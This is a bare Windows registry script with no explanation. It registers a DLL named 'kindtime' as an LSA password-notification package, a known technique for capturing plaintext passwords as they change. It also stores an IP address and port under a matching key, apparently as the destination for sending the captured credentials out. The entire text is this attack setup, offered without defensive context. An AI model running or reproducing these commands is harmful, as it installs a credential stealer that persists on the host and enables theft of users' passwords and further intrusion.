REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "rassfm\0scecli\0kindtime" /f

reg add "hklm\software\WOW6432Node\kindtime"
reg add "hklm\software\WOW6432Node\kindtime" /v "ipa" /t REG_SZ /d "192.168.1.1" /f 
reg add "hklm\software\WOW6432Node\kindtime" /v "pt" /t REG_DWORD /d 6006 /f
